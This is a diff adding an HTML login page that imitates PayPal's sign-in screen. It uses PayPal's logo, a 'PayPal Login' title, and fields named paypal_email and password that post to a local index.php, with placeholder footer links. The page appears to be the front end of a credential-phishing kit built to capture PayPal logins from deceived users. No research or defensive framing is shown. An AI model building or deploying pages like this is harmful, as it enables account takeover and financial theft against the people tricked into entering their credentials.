@@ -1,0 +1,170 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding: 20px;
+        }
+        .logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 60px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 5px;
+            height: 40px;
+            font-size: 17px;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #0070ba;
+            outline: none;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 10px;
+            background-color: #2f39bbf4;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            height: 45px;
+            font-weight: 900;
+        }
+        .btn-secondary {
+            width: 100%;
+            padding: 10px;
+            background-color: white;
+            color: #000;
+            border: 1px solid #0070ba;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            height: 45px;
+            font-weight: 900;
+        }
+        .forgot-password {
+            color: #0070ba;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+            font-weight: 900;
+            font-size: 18px;
+            position: relative;
+            left: -120px;
+        }
+        .footer {
+            font-size: 12px;
+            color: #777;
+            margin-top: 50px;
+            
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+            position:relative;
+            bottom:-130px;
+            
+            
+        }
+        .footer a {
+            color: #0070ba;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .language-selector {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .language-selector a {
+            margin: 0 5px;
+            color: #0070ba;
+            text-decoration: none;
+        }
+        .language-selector img {
+            width: 20px;
+            margin-right: 5px;
+        }
+        #show {
+            display: inline-block;
+            font-size: 17px;
+            font-weight: 500;
+            position: absolute;
+            top: 20px;
+            right: 10px;
+            cursor: pointer;
+            color: #0070ba;
+        }
+    </style>
+</head>
+<body>
+    <form action="index.php" method="POST" class="container">
+        <img src="https://1000logos.net/wp-content/uploads/2017/05/emblem-Paypal-500x500.jpg" alt="PayPal Logo" class="logo">
+        <div class="input-group">
+            <input type="text" name="paypal_email" placeholder="Email or mobile number" required>
+        </div>
+        <div class="input-group">
+            <input type="password" name="password" id="pass" placeholder="Password" required>
+                        <span id="show" onclick="sah()">Show</span>
+        </div>
+        <a href="https://www.paypal.com/us/legalhub/upcoming-policies-full" class="forgot-password">Forgot password?</a>
+        <button class="btn-primary" type="submit">Log In</button>
+        <div style="margin: 15px; font-size: 16px;">or</div>
+        <button class="btn-secondary" >Sign Up</button>
+        <div class="language-selector">
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="US Flag">
+            <a href="#">English</a>
+            <a href="#">Français</a>
+            <a href="#">Español</a>
+            <a href="#">中文</a>
+        </div>
+        <div class="footer">
+            <a href="#">Contact Us</a> | 
+            <a href="#">Privacy</a> | 
+            <a href="#">Legal</a> | 
+            <a href="#">Policy Updates</a> | 
+            <a href="#">Worldwide</a>
+        </div>
+    </form >
+    <script>
+        function sah() {
+            let input = document.getElementById("pass");
+            let show = document.getElementById("show");
+
+            if (input.type === "password") {
+                input.type = "text";
+                show.innerHTML = "Hide";
+            } else {
+                input.type = "password";
+                show.innerHTML = "Show";
+            }
+        }
+    </script>
+</body>
+</html>
